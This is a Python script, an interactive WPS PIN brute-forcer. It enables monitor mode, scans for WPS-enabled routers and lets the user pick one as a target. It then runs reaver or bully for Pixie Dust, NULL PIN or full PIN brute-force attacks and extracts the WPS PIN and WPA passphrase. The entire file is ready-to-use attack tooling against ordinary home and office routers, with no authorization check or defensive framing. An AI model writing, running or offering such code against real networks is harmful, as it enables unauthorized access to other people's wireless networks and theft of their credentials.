#!/usr/bin/env python3
import subprocess
import os
import time
import re
import signal
import sys
import threading
from datetime import datetime

class WPSBruteforcer:
    def __init__(self):
        self.interface = None
        self.monitor_interface = None
        self.target_bssid = None
        self.target_essid = None
        self.target_channel = None
        self.processes = []
        self.pin_found = False
        self.password_found = None
        
    def check_requirements(self):
        required = ['airmon-ng', 'wash', 'reaver', 'bully']
        missing = []
        for tool in required:
            try:
                subprocess.run([tool, '--help'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=2)
            except:
                if tool != 'bully':
                    missing.append(tool)
        return missing
    
    def get_interfaces(self):
        try:
            result = subprocess.run(['airmon-ng'], capture_output=True, text=True, timeout=5)
            interfaces = []
            for line in result.stdout.split('\n'):
                if 'wlan' in line.lower() or 'wlp' in line.lower():
                    parts = line.split()
                    if parts:
                        interfaces.append(parts[0])
            return interfaces
        except:
            return []
    
    def enable_monitor_mode(self, interface):
        try:
            subprocess.run(['airmon-ng', 'check', 'kill'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=10)
            result = subprocess.run(['airmon-ng', 'start', interface], capture_output=True, text=True, timeout=10)
            for line in result.stdout.split('\n'):
                if 'monitor mode' in line.lower() and 'enabled' in line.lower():
                    match = re.search(r'(wlan\d+mon|mon\d+|wlp\S+mon)', line)
                    if match:
                        self.monitor_interface = match.group(1)
                        return True
            self.monitor_interface = f"{interface}mon"
            return True
        except:
            return False
    
    def scan_wps_networks(self, duration=60):
        print(f"\033[93m[*] Scanning for WPS networks ({duration}s)...\033[0m")
        print(f"\033[97m[*] This may take a while\033[0m\n")
        
        wash_cmd = ['wash', '-i', self.monitor_interface, '-C']
        proc = subprocess.Popen(wash_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        self.processes.append(proc)
        
        networks = []
        seen_bssids = set()
        start_time = time.time()
        
        try:
            while time.time() - start_time < duration:
                line = proc.stdout.readline()
                if not line:
                    time.sleep(0.1)
                    continue
                
                if ':' in line and len(line.split()) >= 6:
                    parts = line.split()
                    try:
                        bssid_idx = None
                        for i, part in enumerate(parts):
                            if ':' in part and len(part) == 17:
                                bssid_idx = i
                                break
                        
                        if bssid_idx is not None:
                            bssid = parts[bssid_idx]
                            
                            if bssid not in seen_bssids and bssid.count(':') == 5:
                                channel = parts[bssid_idx + 1] if bssid_idx + 1 < len(parts) else 'N/A'
                                rssi = parts[bssid_idx + 2] if bssid_idx + 2 < len(parts) else 'N/A'
                                wps = parts[bssid_idx + 3] if bssid_idx + 3 < len(parts) else 'N/A'
                                locked = parts[bssid_idx + 4] if bssid_idx + 4 < len(parts) else 'No'
                                essid = ' '.join(parts[bssid_idx + 5:]) if bssid_idx + 5 < len(parts) else 'Hidden'
                                
                                if channel.isdigit():
                                    networks.append({
                                        'bssid': bssid,
                                        'channel': channel,
                                        'rssi': rssi,
                                        'wps': wps,
                                        'locked': locked,
                                        'essid': essid
                                    })
                                    seen_bssids.add(bssid)
                                    print(f"\033[92m[+] Found: {essid[:20]:20s} | {bssid} | Ch: {channel} | WPS: {wps} | Locked: {locked}\033[0m")
                    except:
                        continue
        finally:
            proc.terminate()
            proc.wait(timeout=2)
        
        return networks
    
    def pixie_dust_attack(self, bssid, channel):
        print(f"\n\033[93m[*] Attempting Pixie Dust attack...\033[0m")
        print(f"\033[97m[*] Target: {bssid}\033[0m")
        print(f"\033[97m[*] This attack is fast but may not work on all routers\033[0m\n")
        
        cmd = ['reaver', '-i', self.monitor_interface, '-b', bssid, '-c', channel, '-vv', '-K', '1']
        
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        self.processes.append(proc)
        
        try:
            for line in iter(proc.stdout.readline, ''):
                if not line:
                    break
                
                print(line.rstrip())
                
                if 'WPS PIN:' in line:
                    match = re.search(r'WPS PIN:\s*[\'"]?(\d+)[\'"]?', line)
                    if match:
                        pin = match.group(1)
                        print(f"\n\033[92m[+] PIN FOUND: {pin}\033[0m")
                        self.pin_found = True
                        return pin
                
                if 'WPA PSK:' in line:
                    match = re.search(r'WPA PSK:\s*[\'"]?([^\'"]+)[\'"]?', line)
                    if match:
                        password = match.group(1)
                        print(f"\033[92m[+] PASSWORD: {password}\033[0m")
                        self.password_found = password
                
                if 'Pixie Dust attack failed' in line or 'Failed to' in line:
                    print(f"\n\033[91m[!] Pixie Dust failed\033[0m")
                    return None
        finally:
            proc.terminate()
            proc.wait(timeout=2)
        
        return None
    
    def brute_force_pin(self, bssid, channel, method='reaver'):
        print(f"\n\033[93m[*] Starting WPS PIN brute force...\033[0m")
        print(f"\033[97m[*] Method: {method}\033[0m")
        print(f"\033[97m[*] This will take several hours\033[0m")
        print(f"\033[97m[*] Press Ctrl+C to stop\033[0m\n")
        
        if method == 'reaver':
            cmd = ['reaver', '-i', self.monitor_interface, '-b', bssid, '-c', channel, 
                   '-vv', '-L', '-N', '-d', '2', '-T', '0.5', '-r', '3:15']
        else:
            cmd = ['bully', self.monitor_interface, '-b', bssid, '-c', channel, '-v', '3']
        
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        self.processes.append(proc)
        
        try:
            for line in iter(proc.stdout.readline, ''):
                if not line:
                    break
                
                if 'Trying pin' in line or 'Sending' in line:
                    print(f"\033[97m{line.rstrip()}\033[0m")
                elif 'WPS PIN:' in line or 'Pin is' in line:
                    print(f"\033[92m{line.rstrip()}\033[0m")
                    match = re.search(r'(?:WPS PIN:|Pin is)\s*[\'"]?(\d+)[\'"]?', line)
                    if match:
                        pin = match.group(1)
                        self.pin_found = True
                        return pin
                elif 'WPA PSK:' in line or 'Key:' in line:
                    print(f"\033[92m{line.rstrip()}\033[0m")
                    match = re.search(r'(?:WPA PSK:|Key:)\s*[\'"]?([^\'"]+)[\'"]?', line)
                    if match:
                        password = match.group(1)
                        self.password_found = password
                elif 'WARNING' in line or 'ERROR' in line:
                    print(f"\033[91m{line.rstrip()}\033[0m")
                elif '[+]' in line:
                    print(f"\033[92m{line.rstrip()}\033[0m")
        finally:
            proc.terminate()
            proc.wait(timeout=2)
        
        return None
    
    def smart_attack(self, bssid, channel):
        print(f"\n\033[93m[*] Smart Attack Mode\033[0m")
        print(f"\033[97m[*] Will try Pixie Dust first, then brute force if needed\033[0m\n")
        
        pin = self.pixie_dust_attack(bssid, channel)
        
        if pin:
            print(f"\n\033[92m{'='*70}\033[0m")
            print(f"\033[92m[+] SUCCESS via Pixie Dust!\033[0m")
            print(f"\033[92m[+] WPS PIN: {pin}\033[0m")
            if self.password_found:
                print(f"\033[92m[+] PASSWORD: {self.password_found}\033[0m")
            print(f"\033[92m{'='*70}\033[0m")
            return pin
        
        print(f"\n\033[93m[*] Pixie Dust failed, starting brute force...\033[0m")
        
        pin = self.brute_force_pin(bssid, channel, 'reaver')
        
        if pin:
            print(f"\n\033[92m{'='*70}\033[0m")
            print(f"\033[92m[+] SUCCESS via Brute Force!\033[0m")
            print(f"\033[92m[+] WPS PIN: {pin}\033[0m")
            if self.password_found:
                print(f"\033[92m[+] PASSWORD: {self.password_found}\033[0m")
            print(f"\033[92m{'='*70}\033[0m")
            return pin
        
        return None
    
    def null_pin_attack(self, bssid, channel):
        print(f"\n\033[93m[*] Trying NULL PIN attack...\033[0m\n")
        
        null_pins = ['', '0', '00000000', '12345670']
        
        for null_pin in null_pins:
            print(f"\033[97m[*] Trying PIN: {null_pin if null_pin else 'NULL'}\033[0m")
            
            cmd = ['reaver', '-i', self.monitor_interface, '-b', bssid, '-c', channel, 
                   '-p', null_pin, '-vv', '-N']
            
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
            
            try:
                timeout = time.time() + 30
                while time.time() < timeout:
                    line = proc.stdout.readline()
                    if not line:
                        break
                    
                    if 'WPA PSK:' in line:
                        match = re.search(r'WPA PSK:\s*[\'"]?([^\'"]+)[\'"]?', line)
                        if match:
                            password = match.group(1)
                            print(f"\n\033[92m[+] SUCCESS with NULL PIN!\033[0m")
                            print(f"\033[92m[+] PASSWORD: {password}\033[0m")
                            return password
            finally:
                proc.terminate()
                proc.wait(timeout=2)
        
        print(f"\033[91m[!] NULL PIN attack failed\033[0m")
        return None
    
    def cleanup(self):
        for proc in self.processes:
            try:
                proc.terminate()
                proc.wait(timeout=2)
            except:
                try:
                    proc.kill()
                except:
                    pass
        
        if self.monitor_interface:
            subprocess.run(['airmon-ng', 'stop', self.monitor_interface], 
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def run():
    print("\033[92m" + "="*70)
    print("     WPS PIN BRUTE-FORCER")
    print("="*70 + "\033[0m\n")
    
    brute = WPSBruteforcer()
    
    def signal_handler(sig, frame):
        print("\n\n\033[93m[!] Interrupted. Cleaning up...\033[0m")
        brute.cleanup()
        sys.exit(0)
    
    signal.signal(signal.SIGINT, signal_handler)
    
    missing = brute.check_requirements()
    if missing:
        print(f"\033[91m[!] Missing: {', '.join(missing)}\033[0m")
        print(f"\033[97m[*] Install: apt install aircrack-ng reaver\033[0m")
        return
    
    interfaces = brute.get_interfaces()
    if not interfaces:
        print("\033[91m[!] No wireless interfaces\033[0m")
        return
    
    print("\033[97mInterfaces:\033[0m")
    for i, iface in enumerate(interfaces, 1):
        print(f"  [{i}] {iface}")
    
    choice = input("\n\033[95m[?] Select: \033[0m").strip()
    try:
        idx = int(choice) - 1
        selected = interfaces[idx]
    except:
        print("\033[91m[!] Invalid\033[0m")
        return
    
    print(f"\n\033[93m[*] Enabling monitor mode...\033[0m")
    if not brute.enable_monitor_mode(selected):
        print("\033[91m[!] Failed\033[0m")
        return
    
    print(f"\033[92m[+] Monitor: {brute.monitor_interface}\033[0m\n")
    
    scan_time = input("\033[95m[?] Scan duration (default 60s): \033[0m").strip()
    scan_time = int(scan_time) if scan_time.isdigit() else 60
    
    networks = brute.scan_wps_networks(scan_time)
    
    if not networks:
        print("\n\033[91m[!] No WPS networks found\033[0m")
        brute.cleanup()
        return
    
    unlocked = [n for n in networks if n['locked'].lower() in ['no', '0', 'false']]
    
    print(f"\n\033[92m{'='*70}\033[0m")
    print(f"\033[92m  #  |      BSSID       | CH | RSSI | WPS  | Locked |         ESSID\033[0m")
    print(f"\033[92m{'='*70}\033[0m")
    
    display_nets = unlocked if unlocked else networks
    
    for i, net in enumerate(display_nets, 1):
        locked_color = '\033[91m' if net['locked'].lower() not in ['no', '0', 'false'] else '\033[92m'
        print(f"\033[97m {i:2d}  | {net['bssid']} | {net['channel']:2s} | {net['rssi']:4s} | "
              f"{net['wps']:4s} | {locked_color}{net['locked']:6s}\033[97m | {net['essid'][:20]}\033[0m")
    
    target = input("\n\033[95m[?] Select target #: \033[0m").strip()
    try:
        idx = int(target) - 1
        selected_net = display_nets[idx]
    except:
        print("\033[91m[!] Invalid\033[0m")
        brute.cleanup()
        return
    
    print("\n\033[97mAttack method:\033[0m")
    print("  [1] Smart (Pixie Dust → Brute Force)")
    print("  [2] Pixie Dust only")
    print("  [3] NULL PIN attack")
    print("  [4] Brute Force only")
    
    method = input("\n\033[95m[?] Select: \033[0m").strip()
    
    if method == '1':
        brute.smart_attack(selected_net['bssid'], selected_net['channel'])
    elif method == '2':
        brute.pixie_dust_attack(selected_net['bssid'], selected_net['channel'])
    elif method == '3':
        brute.null_pin_attack(selected_net['bssid'], selected_net['channel'])
    elif method == '4':
        brute.brute_force_pin(selected_net['bssid'], selected_net['channel'])
    
    brute.cleanup()
    print(f"\n\033[92m[+] Done\033[0m")

if __name__ == "__main__":
    run()
